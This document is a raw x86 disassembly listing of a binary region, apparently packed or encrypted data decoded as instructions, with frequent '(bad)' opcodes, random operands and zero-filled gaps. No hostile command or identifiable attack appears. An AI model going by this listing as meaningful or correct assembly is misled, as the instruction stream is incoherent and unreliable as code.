  4189cb:	mov    ch,0x7e
  4189cd:	imul   esp,DWORD PTR [edi-0x25],0x995c5693
  4189d4:	(bad)  
  4189d5:	push   esi
  4189d6:	addr16 mov bh,0x6a
  4189d9:	sbb    BYTE PTR [edi-0x43],0x6c
  4189dd:	and    DWORD PTR [esi],0xffffffc5
  4189e0:	push   0x68b10888
  4189e5:	cmp    DWORD PTR [esi+ecx*4+0x0],0x0
	...
  4189fa:	add    BYTE PTR [eax],al
  4189fc:	jge    0x418983
  4189fe:	lea    esi,es:[eax-0x5c77f778]
  418a05:	js     0x418a81
  418a07:	add    BYTE PTR [edi],al
  418a09:	stos   BYTE PTR es:[edi],al
  418a0a:	es fs add al,0x8d
  418a0e:	or     BYTE PTR [ecx-0x18],dh
  418a11:	mov    al,0x67
  418a13:	imul   esp,DWORD PTR [ebx],0xffffff9d
  418a16:	push   ebp
  418a17:	je     0x418a7e
  418a19:	lds    ebx,FWORD PTR [ebp+esi*2-0x49]
  418a1d:	mov    dl,0x63
  418a1f:	inc    esi
  418a20:	mov    eax,ecx
  418a22:	or     BYTE PTR [ebx-0x7e],dl
  418a25:	sahf   
  418a26:	jl     0x418a9f
  418a28:	les    esp,FWORD PTR [edx-0x7266a397]
  418a2e:	jp     0x418a92
  418a30:	sar    BYTE PTR [esi-0x55caafa4],cl
  418a36:	data16 jae 0x418ab2
  418a39:	mov    cl,0x64
  418a3b:	ins    BYTE PTR es:[edi],dx
  418a3c:	jne    0x4189ef
  418a3e:	jl     0x418aa8
  418a40:	cmc    
  418a41:	ret    
  418a42:	arpl   WORD PTR [esi-0x67],sp
  418a45:	(bad)  
  418a46:	push   ebp
  418a47:	jb     0x4189d1
  418a49:	mov    esp,0xb1f96f57
  418a4e:	push   esp
  418a4f:	inc    esi
  418a50:	mov    ebx,0xf5505cbe
  418a55:	push   ebx
  418a56:	jp     0x418abd
  418a58:	leave  
  418a59:	popf   
  418a5a:	data16 je 0x418a19
  418a5d:	mov    cl,0x64
  418a5f:	push   ebx
	...
  418a74:	aam    0xb4
  418a76:	jl     0x418a78
  418a78:	mul    BYTE PTR [edx-0x49379b97]
  418a7e:	jl     0x418ae9
  418a80:	les    esi,FWORD PTR [edi+eax*2+0x5fb3d868]
  418a87:	add    BYTE PTR [esi],al
  418a89:	mov    eax,0xb1fa746e
  418a8e:	jp     0x418af5
  418a90:	rol    ebx,1
  418a92:	arpl   WORD PTR [esp+ecx*4+0xc],si
  418a96:	cmp    eax,0x2533ca46
  418a9b:	push   eax
  418a9c:	fadd   DWORD PTR [edx+0x19]
  418a9f:	je     0x418a86
  418aa1:	or     ch,BYTE PTR [ebx]
  418aa3:	jno    0x418a31
  418aa5:	sbb    eax,0x82df712a
  418aaa:	sub    al,0x72
  418aac:	lock in eax,dx
  418aae:	and    eax,0x4e5fe971
  418ab3:	pop    edi
  418ab4:	mov    ecx,0xb3480c48
  418ab9:	pop    esi
  418aba:	sbb    BYTE PTR [edi],bh
  418abc:	mov    al,0xbf
  418abe:	pop    ss
  418abf:	add    dh,bl
  418ac1:	push   eax
  418ac2:	sub    eax,0x4848a06d
  418ac7:	addr16 sahf 
  418ac9:	in     eax,dx
  418aca:	cmp    BYTE PTR [ebp-0x62],ch
  418acd:	cdq    
  418ace:	or     al,0x48
  418ad0:	mov    ds:0x6d4e189e,eax
  418ad5:	nop
  418ad6:	adc    eax,0x0
	...
  418aeb:	add    BYTE PTR [edx+edi*8+0x16],bl
  418aef:	je     0x418a7d
  418af1:	cwde   
  418af2:	pop    ss
  418af3:	arpl   WORD PTR [esi-0x75],di
  418af6:	sub    DWORD PTR [ebx+0x71],ebp
  418af9:	in     eax,dx
  418afa:	cmp    BYTE PTR [edi+0x5f],bl
  418afd:	inc    BYTE PTR [ebx]
  418aff:	ins    DWORD PTR es:[edi],dx
  418b00:	pop    esi
  418b01:	leave  
  418b02:	or     BYTE PTR [eax+0x63],cl
  418b05:	fiadd  WORD PTR [esp+eax*2]
  418b08:	xor    eax,0x315f4adf
  418b0d:	ror    BYTE PTR [eax],1
  418b0f:	push   ecx
  418b10:	sub    ecx,ebx
  418b12:	add    al,0x75
  418b14:	sub    eax,0x4f5c163f
  418b19:	rcl    BYTE PTR [edx],cl
  418b1b:	sub    ax,dx
  418b1e:	inc    edi
  418b1f:	jae    0x418b3d
  418b21:	xchg   esp,eax
  418b22:	mov    edi,0x9b722130
  418b27:	or     al,0xeb
  418b29:	xchg   BYTE PTR [edi+esi*1+0x1e9b6acb],al
  418b30:	(bad)  
  418b31:	push   0xffffff84
  418b33:	(bad)  
  418b35:	fs jno 0x418b5c
  418b38:	repnz ins DWORD PTR es:[edi],dx
  418b3a:	mov    ebx,DWORD PTR [esi]
  418b3c:	fst    QWORD PTR [edx+edx*4+0x5680f224]
  418b43:	and    eax,0x4a3371de
  418b48:	loopne 0x418bae
  418b4a:	ss and eax,0x472371be
	...
  418b64:	leave  
  418b65:	data16 and al,0x4a
  418b68:	fsub   DWORD PTR [ebx+edx*1+0x37]
  418b6c:	mov    bl,0x80
  418b6e:	inc    esp
  418b6f:	pop    ss
  418b70:	mov    WORD PTR [esi+esi*1+0x17],cs
  418b74:	mov    al,ds:0xaf173494
  418b79:	xchg   bh,bl
  418b7b:	xor    edi,DWORD PTR [ecx-0x7a]
  418b7e:	adc    eax,DWORD PTR [esp+ebx*2]
  418b81:	arpl   di,bx
  418b83:	xor    eax,DWORD PTR [eax+0x5d04116c]
  418b89:	addr16 aaa 
  418b8b:	add    al,0x5c
  418b8d:	xchg   BYTE PTR [esi],cl
  418b8f:	sub    ch,BYTE PTR [ebx+0x68]
  418b92:	or     al,0x17
  418b94:	stos   BYTE PTR es:[edi],al
  418b95:	jl     0x418b73
  418b97:	pop    ds
  418b98:	mov    WORD PTR [eax-0x53],ds
  418b9b:	aaa    
  418b9c:	pop    esp
  418b9d:	mov    ah,0xa4
  418b9f:	or     edi,DWORD PTR [eax+ebp*2]
  418ba2:	mov    dh,0x15
  418ba4:	das    
  418ba5:	xchg   bh,bl
  418ba7:	and    DWORD PTR ss:[edx-0x45],esi
  418bab:	sbb    cl,BYTE PTR [ebx-0x7a]
  418bae:	or     ah,cl
  418bb0:	jae    0x418c04
  418bb2:	pop    esp
  418bb3:	cdq    
  418bb4:	scas   eax,DWORD PTR es:[edi]
  418bb5:	push   ebp
  418bb6:	jo     0x418b51
  418bb8:	jae    0x418c23
  418bba:	jp     0x418b40
  418bbc:	mov    eax,ds:0xbfbd4e58
  418bc1:	mov    ah,0x4b
  418bc3:	xchg   ecx,eax
  418bc4:	lahf   
  418bc5:	push   0x7b65
	...
  418bda:	add    BYTE PTR [eax],al
  418bdc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418bdd:	xchg   BYTE PTR [esi+edx*4-0x52],dl
  418be1:	xchg   BYTE PTR [ecx+0x7a],ah
  418be4:	jg     0x418c3f
  418be6:	imul   eax,DWORD PTR [ebx+ebp*4-0x6bd5b1b3],0xd24d6567
  418bf1:	pop    ecx
  418bf2:	jp     0x418bf8
  418bf4:	pop    edx
  418bf5:	les    edi,FWORD PTR [ecx+ebp*8]
  418bf8:	rol    DWORD PTR [ebp+0x6a6f3d7c],1
  418bfe:	jns    0x418be9
  418c00:	bound  esp,QWORD PTR [edi+0x6e]
  418c03:	cmp    eax,0x447a5987
  418c08:	pop    esp
  418c09:	push   edx
  418c0a:	pop    esp
  418c0b:	cmp    DWORD PTR [eax],ebp
  418c0d:	push   edi
  418c0e:	jo     0x418c29
  418c10:	lods   al,BYTE PTR ds:[esi]
  418c11:	addr16 jp 0x418c20
  418c14:	call   0x5f72:0xaf1b5858
  418c1b:	adc    eax,0x190883a5
  418c20:	mov    cl,0x83
  418c22:	jns    0x418c22
  418c24:	scas   al,BYTE PTR es:[edi]
  418c25:	xchg   BYTE PTR [ecx+ebp*8-0x61],ch
  418c29:	pop    ecx
  418c2a:	jns    0x418c06
  418c2c:	jbe    0x418c95
  418c2e:	jp     0x418bf5
  418c30:	add    DWORD PTR [ecx+0x4c8fcc78],0x65
  418c37:	fisub  DWORD PTR [ebx-0x25ffbb6c]
  418c3d:	scas   al,BYTE PTR es:[edi]
  418c3e:	ins    DWORD PTR es:[edi],dx
  418c3f:	outs   dx,BYTE PTR ds:[esi]
	...
  418c54:	mov    ch,0xc5
  418c56:	arpl   WORD PTR [edx-0x1f],si
  418c59:	xchg   ebp,eax
  418c5a:	dec    ebp
  418c5b:	outs   dx,BYTE PTR ds:[esi]
  418c5c:	int3   
  418c5d:	mov    eax,ds:0xc5f9616d
  418c62:	push   ebp
  418c63:	je     0x418c82
  418c65:	xchg   ebp,eax
  418c66:	dec    esi
  418c67:	je     0x418c8e
  418c69:	ret    0x746d
  418c6c:	adc    bl,dh
  418c6e:	jl     0x418cdd
  418c70:	sbb    DWORD PTR [ebp-0x6718b9ac],edx
  418c76:	imul   esp,DWORD PTR [ecx-0x1f],0xffffffac
  418c7a:	aaa    
  418c7b:	add    BYTE PTR [ebx],bl
  418c7d:	cwde   
  418c7e:	imul   sp,WORD PTR [ebp-0x57],0x615e
  418c84:	fisttp DWORD PTR [ebp+edi*2+0x6b]
  418c88:	rol    ah,1
  418c8a:	inc    edi
  418c8b:	outs   dx,DWORD PTR ds:[esi]
  418c8c:	jnp    0x418c3c
  418c8e:	ins    DWORD PTR es:[edi],dx
  418c8f:	imul   edi,DWORD PTR [bx+0x7369],0x6e639d66
  418c98:	xchg   ax,ax
  418c9a:	push   esp
  418c9b:	push   ebx
  418c9c:	rcr    BYTE PTR [edi-0x49859689],1
  418ca2:	ja     0x418ca4
  418ca4:	(bad)  
  418ca5:	mov    bl,0x6e
  418ca7:	je     0x418c4b
  418ca9:	mov    ch,0x7a
  418cab:	gs test eax,0xa16e55be
  418cb1:	lea    ebx,[edi+0x65]
  418cb4:	mov    DWORD PTR [edi+0x6369],edi
	...
  418cca:	add    BYTE PTR [eax],al
  418ccc:	loopne 0x418c6c
  418cce:	imul   eax,DWORD PTR [esi+0x7d],0xbb6f4790
  418cd5:	stos   BYTE PTR es:[edi],al
  418cd6:	ins    DWORD PTR es:[edi],dx
  418cd7:	addr16 xchg ebp,eax
  418cd9:	rcl    BYTE PTR [ebp+0x74],0x8c
  418cdd:	ror    DWORD PTR [eax],cl
  418cdf:	push   ebx
  418ce0:	sub    bh,bl
  418ce2:	sbb    bl,BYTE PTR [edi+0x4a]
  418ce5:	xor    edi,DWORD PTR [ecx]
  418ce7:	add    BYTE PTR [eax+0x3e],cl
  418cea:	adc    dh,BYTE PTR [ecx+ebp*1+0x3e]
  418cee:	out    0x77,eax
  418cf0:	sub    DWORD PTR [edi],esi
  418cf2:	or     DWORD PTR [edx+ecx*2+0x37],ebx
  418cf6:	cmp    DWORD PTR [edx+0x1],edx
  418cf9:	sbb    edx,DWORD PTR [ecx]
  418cfb:	add    dh,bl
  418cfd:	sbb    BYTE PTR [eax+ebp*2],bl
  418d00:	fist   WORD PTR [ebx*1+0x1615a263]
  418d07:	ins    BYTE PTR es:[edi],dx
  418d08:	mov    WORD PTR [edx],ds
  418d0a:	cs jb  0x418ce7
  418d0d:	or     BYTE PTR [ebx],bl
  418d0f:	add    cl,al
  418d11:	jp     0x418d41
  418d13:	jb     0x418cf7
  418d15:	dec    esp
  418d16:	adc    eax,0x29bd8c63
  418d1b:	jno    0x418cdc
  418d1d:	push   esi
  418d1e:	daa    
  418d1f:	jb     0x418cd1
  418d21:	in     eax,dx
  418d22:	ds je  0x418ce1
  418d25:	popf   
  418d26:	daa    
  418d27:	jb     0x418cc9
  418d29:	in     eax,dx
  418d2a:	cmp    ebp,DWORD PTR [ebp-0x56]
  418d2d:	mov    ecx,0x5f0f
	...
  418d42:	add    BYTE PTR [eax],al
  418d44:	sahf   
  418d45:	push   eax
  418d46:	cmp    BYTE PTR [ecx-0x62],al
  418d49:	mov    ah,0x2d
  418d4b:	jb     0x418db5
  418d4d:	mov    esi,0x945f622d
  418d52:	adc    BYTE PTR [ebx+0x5c],ah
  418d55:	mov    al,ds:0xfa656c2e
  418d5a:	adc    BYTE PTR [ebx+0x5e],ah
  418d5d:	in     eax,dx
  418d5e:	and    al,0x42
  418d60:	jne    0x418d5b
  418d62:	xor    esp,DWORD PTR [edi+0x6a]
  418d65:	nop
  418d66:	add    al,0x0
  418d68:	outs   dx,BYTE PTR ds:[esi]
  418d69:	xchg   esp,eax
  418d6a:	fcom   DWORD PTR [edi]
  418d6c:	xor    eax,0x4426c56d
  418d71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d72:	ret    
  418d73:	adc    al,0x8c
  418d75:	dec    esp
  418d76:	mov    dh,0x14
  418d78:	cmp    BYTE PTR [esi-0x40],ah
  418d7b:	push   ds
  418d7c:	das    
  418d7d:	xchg   esp,eax
  418d7e:	pushf  
  418d7f:	adc    al,0x2f
  418d81:	or     ch,0x22
  418d84:	daa    
  418d85:	jno    0x418d66
  418d87:	xor    esi,DWORD PTR [ebx]
  418d89:	adc    DWORD PTR [edx-0x747d06e8],0x3
  418d90:	fsub   QWORD PTR [edi-0x6f]
  418d93:	pop    ss
  418d94:	mov    WORD PTR [ebx+0x76],fs
  418d97:	sub    eax,edi
  418d99:	jg     0x418d1b
  418d9b:	adc    eax,0xbac58ef
  418da0:	fdiv   QWORD PTR [ebp-0x73]
  418da3:	inc    edi
  418da4:	fisubr WORD PTR [ebp+0x7d]
  418da7:	add    BYTE PTR es:[eax],al
	...
  418dba:	add    BYTE PTR [eax],al
  418dbc:	mov    al,0x63
  418dbe:	inc    esp
  418dbf:	adc    edi,DWORD PTR [ebp-0x42e1b993]
  418dc5:	xchg   esp,eax
  418dc6:	cmp    ecx,DWORD PTR [ecx-0x4c]
  418dc9:	test   BYTE PTR [eax+0x1e],al
  418dcc:	enter  0x5882,0x16
  418dd0:	scas   eax,DWORD PTR es:[edi]
  418dd1:	xchg   esp,eax
  418dd2:	adc    ebp,DWORD PTR [eax]
  418dd4:	sahf   
  418dd5:	ins    DWORD PTR es:[edi],dx
  418dd6:	xor    eax,0x49a69d29
  418ddb:	adc    ecx,DWORD PTR [edx+esi*4-0x7c82daf1]
  418de2:	push   ds
  418de3:	pop    ds
  418de4:	jle    0x418e56
  418de6:	shl    ebx,0xb5
  418de9:	mov    ah,0xc1
  418deb:	add    ebp,DWORD PTR [esi+0x7932dfa8]
  418df1:	outs   dx,BYTE PTR ds:[esi]
  418df2:	sti    
  418df3:	push   ss
  418df4:	inc    ebx
  418df5:	or     BYTE PTR [eax],0xc
  418df8:	pushf  
  418df9:	push   ebx
  418dfa:	jo     0x418df5
  418dfc:	test   al,0x66
  418dfe:	dec    esp
  418dff:	fld    TBYTE PTR [eax+0x54e96b7e]
  418e05:	jl     0x418e7f
  418e07:	enter  0x5099,0x7a
  418e0b:	rcr    BYTE PTR [ecx-0x754eaa8d],0x6b
  418e12:	imul   ebp,ecx,0x5e
  418e15:	jae    0x418e91
  418e17:	mov    edi,0x94088264
  418e1c:	jle    0x418e91
  418e1e:	jp     0x418dd7
	...
  418e34:	mov    al,0x69
  418e36:	imul   ebp,ecx,0xffffffbf
  418e39:	push   ebp
  418e3a:	jns    0x418dd6
  418e3c:	mov    ds:0x8f857a67,al
  418e41:	push   edi
  418e42:	pop    eax
  418e43:	mov    BYTE PTR [esi-0x7d],bh
  418e46:	jge    0x418dd6
  418e48:	jge    0x418eba
  418e4a:	or     BYTE PTR [ebp-0x75947d88],ch
  418e50:	jnp    0x418eb9
  418e52:	jp     0x418eb4
  418e54:	nop
  418e55:	arpl   WORD PTR [ebp+0x47],sp
  418e58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e59:	jg     0x418ec2
  418e5b:	pop    ebx
  418e5c:	gs pop eax
  418e5e:	inc    esi
  418e5f:	sub    dh,BYTE PTR [eax-0x4c]
  418e62:	pop    ecx
  418e63:	push   esi
  418e64:	jb     0x418de6
  418e66:	jge    0x418eb0
  418e68:	jle    0x418edb
  418e6a:	push   esp
  418e6b:	sub    ch,BYTE PTR [ebp+edx*2+0x79]
  418e6f:	cmp    dh,BYTE PTR [ecx+0x73]
  418e72:	dec    esi
  418e73:	cmp    eax,0x354e58c0
  418e78:	mov    eax,0x9b0a69b5
  418e7d:	and    DWORD PTR [esi+0x15],0x4e949f
  418e84:	jmp    0xe7a6e62a
  418e89:	lahf   
  418e8a:	imul   esi,DWORD PTR [edx-0x1b],0x78707c4f
  418e91:	mov    eax,ds:0xb1037269
  418e96:	popa   
  418e97:	add    BYTE PTR gs:[eax],al
	...
  418eaa:	add    BYTE PTR [eax],al
  418eac:	mov    ch,0x4f
  418eae:	jl     0x418f20
  418eb0:	cmc    
  418eb1:	mov    al,0x77
  418eb3:	jae    0x418e8f
  418eb5:	xchg   esi,eax
  418eb6:	jp     0x418f1c
  418eb8:	mov    ch,0xa6
  418eba:	dec    esi
  418ebb:	je     0x418ea2
  418ebd:	rcl    DWORD PTR [ebp+0x73],0xd6
  418ec1:	sahf   
  418ec2:	arpl   WORD PTR [edx-0x37],si
  418ec5:	xchg   ecx,eax
  418ec6:	dec    esi
  418ec7:	je     0x418eee
  418ec9:	dec    ebp
  418eca:	ins    DWORD PTR es:[edi],dx
  418ecb:	jb     0x418ed5
  418ecd:	mov    dl,0x7c
  418ecf:	outs   dx,DWORD PTR ds:[esi]
  418ed0:	pop    ss
  418ed1:	mov    BYTE PTR [eax],cl
  418ed3:	push   ebx
  418ed4:	adc    cl,BYTE PTR [edi+0x5c]
  418ed7:	push   edi
  418ed8:	xor    al,0xc3
  418eda:	dec    ecx
  418edb:	pop    esp
  418edc:	xor    edx,DWORD PTR [edx+0x40]
  418edf:	and    dh,dh
  418ee1:	xchg   ebp,eax
  418ee2:	outs   dx,BYTE PTR ds:[esi]
  418ee3:	je     0x418ebf
  418ee5:	mov    al,0x7a
  418ee7:	ror    DWORD PTR gs:[esi+0x64],1
  418eeb:	imul   edx,ebx,0xc64154af
  418ef1:	mov    bl,0x63
  418ef3:	jne    0x418f68
  418ef5:	pushf  
  418ef6:	ja     0x418ef8
  418ef8:	xchg   BYTE PTR [edi-0x4ea58b92],dl
  418efe:	jp     0x418f65
  418f00:	or     DWORD PTR [esi+0x5c],0x6db46650
  418f07:	mov    gs:0x9c53549c,eax
  418f0d:	pushf  
  418f0e:	imul   esi,DWORD PTR [ebx+0x0],0x0
	...
  418f21:	add    BYTE PTR [eax],al
  418f23:	add    BYTE PTR [ebx+ebp*8-0x609592c9],cl
  418f2a:	sbb    ebx,DWORD PTR [edi+0x5e]
  418f2d:	mov    BYTE PTR [eax],bh
  418f2f:	push   ecx
  418f30:	jae    0x418ebf
  418f32:	adc    BYTE PTR [eax-0x56],bl
  418f35:	mov    ds,WORD PTR [edx]
  418f37:	xor    BYTE PTR gs:[ebp-0x20b0afd0],ch
  418f3e:	adc    DWORD PTR [ebx+0x32],esp
  418f41:	fbld   TBYTE PTR [ecx+edx*2]
  418f44:	and    eax,0x8c712dd7
  418f49:	cmc    
  418f4a:	adc    edi,DWORD PTR [eax+0x2f]
  418f4d:	jmp    0x418f21
  418f4f:	ins    BYTE PTR es:[edi],dx
  418f50:	xor    bh,al
  418f52:	or     BYTE PTR [esi+0x20],ah
  418f55:	cmp    edx,DWORD PTR ds:0xd33f1f5f
  418f5b:	ins    BYTE PTR es:[edi],dx
  418f5c:	jmp    DWORD PTR [ecx]
  418f5e:	or     DWORD PTR [ebx+ecx*8+0x2d],ebx
  418f62:	cmp    BYTE PTR [ebp-0xe],ch
  418f65:	adc    DWORD PTR [edi+ebx*2],ebx
  418f68:	(bad)  
  418f69:	sbb    BYTE PTR ds:0x2e6ff544,ah
  418f6f:	popa   
  418f70:	fsub   DWORD PTR [edx]
  418f72:	pop    ss
  418f73:	ja     0x418f21
  418f75:	cmp    bl,BYTE PTR [ecx]
  418f77:	jae    0x418f58
  418f79:	std    
  418f7a:	and    al,0x51
  418f7c:	mov    ah,0x5c
  418f7e:	sbb    ah,BYTE PTR [ebx-0x58]
  418f81:	scas   al,BYTE PTR es:[edi]
  418f82:	sub    eax,0x1654c074
  418f87:	add    BYTE PTR gs:[eax],al
	...
  418f9a:	add    BYTE PTR [eax],al
  418f9c:	mov    edi,0x9f6127f3
  418fa1:	std    
  418fa2:	and    al,0x51
  418fa4:	mov    ah,0x5c
  418fa6:	sbb    ah,BYTE PTR [ebx-0x50]
  418fa9:	mov    gs,WORD PTR ds:0x16549874
  418faf:	gs jg  0x418f46
  418fb2:	dec    esi
  418fb3:	shl    DWORD PTR [eax-0x5c],cl
  418fb6:	xlat   BYTE PTR ss:[ebx]
  418fb8:	test   eax,0x8c110277
  418fbd:	push   eax
  418fbe:	xor    bl,BYTE PTR [ebx+ecx*2]
  418fc1:	data16 add al,0x28
  418fc4:	cmp    eax,0x7317fb79
  418fc9:	add    BYTE PTR [esi],0x11
  418fcc:	mov    ds:0x331ff067,al
  418fd1:	push   0x476003c4
  418fd6:	xlat   BYTE PTR ds:[ebx]
  418fd7:	and    bh,BYTE PTR [esi]
  418fd9:	jns    0x418f9e
  418fdb:	xor    BYTE PTR [edi],ch
  418fdd:	push   0x7b3a1adb
  418fe2:	mov    dl,0x2c
  418fe4:	jae    0x419039
  418fe6:	out    dx,eax
  418fe7:	sub    al,0x5f
  418fe9:	ret    0x12b2
  418fec:	and    BYTE PTR [ebp-0x45],bh
  418fef:	mov    WORD PTR es:[eax-0x5e],ss
  418ff3:	sbb    al,0xea
  418ff5:	jp     0x418f83
  418ff7:	es int 0x69
  418ffa:	(bad)  
  418ffb:	jecxz  0x418fd9
  418ffd:	or     DWORD PTR [ebp+0x17],0x0
	...
  419014:	loope  0x41908b
  419016:	jno    0x41903e
  419018:	mov    WORD PTR [eax+0x7adc228c],es
  41901e:	jae    0x419033
  419020:	mov    WORD PTR [ecx+0x75],gs
  419023:	pop    ds
  419024:	scas   eax,DWORD PTR es:[edi]
  419025:	jne    0x419076
  419027:	fisubr DWORD PTR [esi-0x42fbb394]
  41902d:	jge    0x419082
  41902f:	and    DWORD PTR [ebp-0x5fdab43e],edi
  419035:	xchg   esp,eax
  419036:	xor    bl,BYTE PTR ds:0xda327998
  41903c:	mov    dl,0x82
  41903e:	or     BYTE PTR [eax-0x78],al
  419041:	push   eax
  419042:	inc    esp
  419043:	inc    esp
  419044:	mov    cl,0x64
  419046:	pop    ebp
  419047:	or     BYTE PTR [edx-0x52d2ab89],bl
  41904d:	push   ebx
  41904e:	js     0x41907f
  419050:	mov    esp,0xa73a0844
  419055:	pop    edx
  419056:	pop    esp
  419057:	push   ds
  419058:	dec    ecx
  419059:	inc    esi
  41905a:	dec    ebx
  41905b:	sbb    eax,0xf9677794
  419060:	sahf   
  419061:	push   ebx
  419062:	jp     0x419068
  419064:	nop
  419065:	pop    ebx
  419066:	data16 ficom DWORD PTR [ebx+0x7fcd6453]
  41906d:	push   ebx
  41906e:	jl     0x419031
  419070:	(bad)  
  419071:	pop    eax
  419072:	addr16 aad 0x70
  419075:	pop    eax
  419076:	pop    edi
  419077:	mov    ebx,0x0
	...
  41908c:	pop    DWORD PTR [edi+eiz*2-0x46]
  419090:	sub    BYTE PTR [ecx+0x65],0xbb
  419094:	jae    0x41902a
  419096:	inc    eax
  419097:	mov    esi,0x884668a2
  41909c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41909d:	jne    0x4190a7
  41909f:	mov    ah,0xa2
  4190a1:	jne    0x41911d
  4190a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4190a4:	test   al,0x7d
  4190a6:	imul   ebp,ecx,0xffffffa1
  4190a9:	jne    0x41910e
  4190ab:	xchg   esi,eax
  4190ac:	xchg   ebx,eax
  4190ad:	jne    0x4190fb
  4190af:	nop
  4190b0:	xor    DWORD PTR [ebp+0x69],0x6f66767d
  4190b7:	jmp    0x5dbc103b
  4190bc:	xchg   BYTE PTR [ebp+0x63],ah
  4190bf:	dec    ebx
  4190c0:	ins    DWORD PTR es:[edi],dx
  4190c1:	data16 or BYTE PTR [edi],ch
  4190c4:	jnp    0x41910a
  4190c6:	jp     0x419106
  4190c8:	jl     0x419149
  4190ca:	imul   eax,DWORD PTR [eax],0x53088cba
  4190d0:	retf   0x7cb6
  4190d3:	ja     0x419099
  4190d5:	mov    ch,BYTE PTR [ecx+0x5c]
  4190d8:	test   al,0xb7
  4190da:	jp     0x419150
  4190dc:	pushf  
  4190dd:	mov    gs,WORD PTR [eax]
  4190df:	push   eax
  4190e0:	xchg   edi,eax
  4190e1:	(bad)  
  4190e2:	pop    edi
  4190e3:	jb     0x419081
  4190e5:	mov    WORD PTR [eax],cs
  4190e7:	pop    esp
  4190e8:	mov    bh,0x46
  4190eb:	imul   esp,ecx,0x707c53
	...
  419101:	add    BYTE PTR [eax],al
  419103:	add    bl,cl
  419105:	nop
  419106:	imul   sp,bp,0x4cab
  41910b:	push   ebx
  41910c:	mov    WORD PTR [ecx+ebp*2+0x668f9b73],es
  419113:	imul   esp,DWORD PTR [ebp-0x2e9ab947],0xc3697ab1
  41911d:	mov    ah,0x8
  41911f:	push   eax
  419120:	aam    0x8a
  419122:	ja     0x41917b
  419124:	retf   0x6c87
  419127:	add    al,dh
  419129:	xchg   DWORD PTR [eax+eax*1+0x20],esp
  41912d:	mov    ch,BYTE PTR [ecx+0x72]
  419130:	cmp    edi,DWORD PTR [eax-0x589a9a9f]
  419136:	arpl   WORD PTR [edi+0x11],bp
  419139:	mov    cl,0x6d
  41913b:	jb     0x41914d
  41913d:	mov    edx,0xa0e76f7c
  419142:	or     BYTE PTR [eax+0xa],dl
  419145:	xchg   DWORD PTR [eax+eax*1-0xa],edi
  419149:	lea    ebp,[esi+0x74]
  41914c:	ret    0x7ab8
  41914f:	gs leave 
  419151:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419152:	arpl   WORD PTR [ebp-0x1f],si
  419155:	nop
  419156:	sub    BYTE PTR [edx-0x74],dl
  419159:	push   esp
  41915a:	sbb    ah,BYTE PTR [ebx-0x62]
  41915d:	fwait
  41915e:	cmp    BYTE PTR [ebx-0x51],ah
  419161:	inc    ebx
  419162:	adc    ch,BYTE PTR [ebp-0x58]
  419165:	bound  esp,QWORD PTR [edi]
  419167:	add    BYTE PTR [bx+si],al
	...
  41917a:	add    BYTE PTR [eax],al
  41917c:	test   eax,0x715520ae
  419181:	pop    ebp
  419182:	dec    eax
  419183:	jb     0x4191fa
  419185:	xchg   ecx,eax
  419186:	adc    eax,0x12a24f5c
  41918b:	outs   dx,BYTE PTR ds:[esi]
  41918c:	imul   ebx,DWORD PTR [esi-0xe8498e8],0xa03f001b
  419196:	push   ds
  419197:	jbe    0x41920a
  419199:	in     eax,dx
  41919a:	and    al,0x77
  41919c:	pop    esp
  41919d:	mov    al,ds:0x8b60460c
  4191a2:	in     al,dx
  4191a3:	inc    eax
  4191a4:	push   ebx
  4191a5:	sub    DWORD PTR ds:0x93f4b52,esp
  4191ab:	inc    esi
  4191ac:	pop    eax
  4191ad:	sub    ecx,DWORD PTR [ebp+ecx*2+0x5a]
  4191b1:	sti    
  4191b2:	into   
  4191b3:	outs   dx,DWORD PTR ds:[esi]
  4191b4:	push   ds
  4191b5:	loope  0x4191bf
  4191b7:	pop    esp
  4191b8:	cmp    al,0x2d
  4191ba:	adc    BYTE PTR [esi+0x25],ah
  4191bd:	xlat   BYTE PTR ds:[ebx]
  4191be:	adc    eax,0xd7a8c71
  4191c3:	cld    
  4191c4:	xchg   ebx,eax
  4191c5:	addr16 pop ebx
  4191c7:	call   0xfd919cb1
  4191cc:	in     al,0x11
  4191ce:	add    eax,0xd02ea670
  4191d3:	(bad)  
  4191d4:	jmp    0x419247
  4191d6:	add    eax,0xcfd3df70
  4191db:	sub    al,0x8c
  4191dd:	pop    ds
  4191de:	add    eax,0x70
	...
  4191f3:	add    BYTE PTR [esi-0x4d002fd2],al
  4191f9:	xchg   esp,eax
  4191fa:	dec    edi
  4191fb:	pop    ds
  4191fc:	mov    esi,0xd310df75
  419201:	jle    0x419246
  419203:	fisubr DWORD PTR [edi-0x3efba48b]
  419209:	inc    ebx
  41920a:	pop    esi
  41920b:	and    ah,BYTE PTR [eax-0x50e9bf99]
  419211:	push   eax
  419212:	cs adc al,0x6f
  419215:	bound  eax,QWORD PTR [eax-0x1c]
  419218:	pop    esp
  419219:	jg     0x419220
  41921b:	adc    BYTE PTR [ecx-0x73e0ee8b],al
  419221:	pusha  
  419222:	add    BYTE PTR ds:0x1b2bb460,dl
  419228:	pop    esi
  419229:	jns    0x41922d
  41922b:	adc    BYTE PTR [ecx+0x62],ch
  41922e:	or     ch,dl
  419230:	rcr    DWORD PTR [ebx+0x0],cl
  419233:	adc    eax,0x1a28b440
  419238:	cmp    eax,0x2817c068
  41923d:	mov    ah,0xaf
  41923f:	and    bh,BYTE PTR [eax]
  419241:	jl     0x419222
  419243:	cmp    BYTE PTR [ecx+edi*2],bl
  419246:	shl    DWORD PTR [edx],1
  419248:	jb     0x4192a6
  41924a:	xchg   ebx,eax
  41924b:	ss dec eax
  41924d:	push   eax
  41924e:	mov    dl,0x1b
  419250:	das    
  419251:	or     bl,0x27
  419254:	stc    
  419255:	fs int3 
  419257:	sbb    DWORD PTR [eax],eax
	...
  419269:	add    BYTE PTR [eax],al
  41926b:	add    al,ah
  41926d:	jae    0x41920d
  41926f:	push   ss
  419270:	out    0x75,eax
  419272:	test   DWORD PTR [edi],ebx
  419274:	mov    WORD PTR [edi-0x78],fs
  419277:	adc    al,0xef
  419279:	jbe    0x419216
  41927b:	adc    ebx,ebp
  41927d:	bound  esi,QWORD PTR [ebp+0x14]
  419280:	stos   BYTE PTR es:[edi],al
  419281:	jb     0x41921b
